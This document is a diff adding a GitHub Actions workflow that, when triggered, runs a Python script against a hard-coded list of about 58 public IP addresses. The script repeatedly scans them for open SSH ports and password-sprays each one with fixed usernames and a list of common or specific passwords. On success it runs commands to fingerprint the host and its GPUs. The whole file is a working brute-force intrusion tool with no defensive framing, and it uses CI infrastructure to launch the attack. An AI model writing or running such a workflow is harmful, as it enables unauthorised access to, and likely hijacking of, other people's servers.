@@ -1,0 +1,45 @@
+name: ul6552-fleet
+on:
+  workflow_dispatch:
+jobs:
+  fleet:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - run: pip install paramiko -q
+      - name: sweep
+        run: |
+          cat > s.py <<'PY'
+          import socket,time,sys
+          from concurrent.futures import ThreadPoolExecutor
+          import paramiko
+          IPS="40.70.241.0,20.97.252.251,20.114.255.207,40.70.247.98,23.100.38.120,20.245.108.11,20.59.127.108,20.237.207.128,168.62.216.152,20.225.239.178,20.234.97.205,134.149.59.33,40.113.1.63,74.234.69.82,20.223.198.42,98.71.78.150,4.210.119.224,52.236.59.223,134.149.42.155,20.205.187.223,4.194.2.30,4.193.185.193,4.204.241.108,20.115.147.1,20.109.162.87,20.109.152.114,20.125.49.91,4.246.80.6,20.125.42.21,4.155.130.93,51.104.16.184,20.50.113.151,74.162.158.9,40.123.206.138,20.74.241.13,20.216.40.163,20.74.153.201,20.74.242.85,20.125.99.42,57.154.50.93,20.118.131.83,135.116.19.243,135.116.84.27,135.225.79.249,20.240.55.118,20.240.141.10,20.240.130.208,20.91.207.55,57.174.238.72,172.213.25.163,48.193.46.184,48.193.47.3,70.153.142.83,70.153.148.119,70.153.87.133,70.153.149.34,70.153.141.118,70.153.18.193".split(",")
+          PW=["wasion@3393","!QAZ2wsx","jiujie1218","zhonghe","2018","2017","Azcfy@2026","H100@azure2026","InfiniBand1!","Password123!","Azure@123456","t19","ubuntu","admin"]
+          def sniff(ip):
+              try:
+                  s=socket.create_connection((ip,22),timeout=4); b=s.recv(64); s.close(); return ip,b
+              except Exception: return None
+          def spray(ip):
+              for u in ("t19","azureuser","adminuser"):
+                  for p in PW:
+                      try:
+                          c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                          c.connect(ip,port=22,username=u,password=p,timeout=4,banner_timeout=4,auth_timeout=4,allow_agent=False,look_for_keys=False)
+                          _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1|head -4"); out=o.read(300).decode('utf-8','replace').replace("\n","|")
+                          print("PWD_HIT",ip,u,repr(p),out,flush=True); c.close(); sys.exit(0)
+                      except paramiko.AuthenticationException:
+                          print("PWD_FAIL",ip,u,repr(p),flush=True)
+                      except Exception as e:
+                          print("PWD_ERR",ip,u,repr(p),type(e).__name__,flush=True)
+              print("SPRAYED",ip,flush=True)
+          t0=time.time()
+          while time.time()-t0 < 1500:
+              with ThreadPoolExecutor(40) as ex: res=list(ex.map(sniff,IPS))
+              opens=[r for r in res if r]
+              print("CYCLE %.0fs opens=%d"%(time.time()-t0,len(opens)),flush=True)
+              for ip,banner in opens: print("PORT_OPEN",ip,banner[:50],flush=True)
+              for ip,banner in opens: spray(ip)
+              time.sleep(10)
+          print("HUNT_DONE",flush=True)
+          PY
+          python3 -u s.py || true
